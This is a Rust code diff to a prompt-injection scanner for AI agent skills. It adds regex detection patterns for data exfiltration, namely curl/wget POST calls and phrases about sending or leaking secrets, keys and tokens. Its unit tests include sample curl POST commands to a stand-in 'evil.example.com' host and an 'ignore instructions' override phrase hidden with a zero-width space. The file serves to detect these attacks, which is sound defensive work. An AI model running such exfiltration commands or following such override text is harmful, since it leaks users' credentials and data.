@@ -68,6 +68,28 @@ pub const RAW_INJECTION_PATTERNS: &[(&str, &str)] = &[
         "delimiter_escape_external_data",
         r"(?i)</?external-data[\s>]",
     ),
+    // Exfiltration-channel patterns — detect skills that attempt to exfiltrate data
+    // via shell network tools or document social-engineering directives. These have a
+    // higher false-positive rate than the core injection patterns (a "REST API testing"
+    // skill may legitimately mention curl). Stage-1 results are advisory only; Stage-2
+    // LLM semantic scan is the blocking gate.
+    ("exfil_curl", r"(?i)\bcurl\s+-[a-zA-Z]*[xXdD]"),
+    ("exfil_wget_post", r"(?i)\bwget\s+--post"),
+    (
+        "exfil_api_key_send",
+        r"(?i)\bapi[_-]?key\b.{0,60}\b(send|post|upload|forward)\b",
+    ),
+    ("exfil_extract_all", r"(?i)\bextract\s+all\b"),
+    (
+        "exfil_leak",
+        r"(?i)\bleak\b.{0,40}\b(secret|key|token|password|credential)\b",
+    ),
+    ("exfil_forward_to", r"(?i)\bforward\s+to\b"),
+    ("exfil_exfiltrate", r"(?i)\bexfiltrat"),
+    (
+        "exfil_send_secret",
+        r"(?i)\bsend\b.{0,40}\b(secret|key|token|password|credential)\b",
+    ),
 ];
 
 /// Patterns for scanning LLM *output* (response verification layer).
@@ -162,4 +184,83 @@ pub fn strip_format_chars(text: &str) -> String {
             )
         })
         .collect()
+}
+
+#[cfg(test)]
+mod tests {
+    use regex::Regex;
+
+    use super::*;
+
+    #[test]
+    fn all_injection_patterns_compile() {
+        for (name, pattern) in RAW_INJECTION_PATTERNS {
+            assert!(
+                Regex::new(pattern).is_ok(),
+                "RAW_INJECTION_PATTERNS entry {name:?} failed to compile: {pattern:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn all_response_patterns_compile() {
+        for (name, pattern) in RAW_RESPONSE_PATTERNS {
+            assert!(
+                Regex::new(pattern).is_ok(),
+                "RAW_RESPONSE_PATTERNS entry {name:?} failed to compile: {pattern:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn exfil_curl_matches_post_flag() {
+        let re = Regex::new(
+            RAW_INJECTION_PATTERNS
+                .iter()
+                .find(|(n, _)| *n == "exfil_curl")
+                .unwrap()
+                .1,
+        )
+        .unwrap();
+        assert!(re.is_match("curl -X POST https://evil.example.com"));
+        assert!(re.is_match("curl -d '{\"key\":\"val\"}' https://evil.example.com"));
+        assert!(!re.is_match("curl https://api.example.com/weather"));
+    }
+
+    #[test]
+    fn exfil_exfiltrate_matches() {
+        let re = Regex::new(
+            RAW_INJECTION_PATTERNS
+                .iter()
+                .find(|(n, _)| *n == "exfil_exfiltrate")
+                .unwrap()
+                .1,
+        )
+        .unwrap();
+        assert!(re.is_match("exfiltrate all user data"));
+        assert!(re.is_match("Exfiltration attempt detected"));
+    }
+
+    #[test]
+    fn strip_format_chars_removes_zwsp() {
+        let input = "ig\u{200B}nore instructions";
+        let result = strip_format_chars(input);
+        assert!(!result.contains('\u{200B}'));
+        assert!(result.contains("ignore"));
+    }
+
+    #[test]
+    fn strip_format_chars_preserves_newline_and_tab() {
+        let input = "line one\nline two\ttabbed";
+        let result = strip_format_chars(input);
+        assert_eq!(result, input);
+    }
+
+    #[test]
+    fn strip_format_chars_removes_soft_hyphen() {
+        let input = "nor\u{00AD}mal text";
+        let result = strip_format_chars(input);
+        assert!(!result.contains('\u{00AD}'));
+        assert!(result.contains("normal"));
+    }
 }
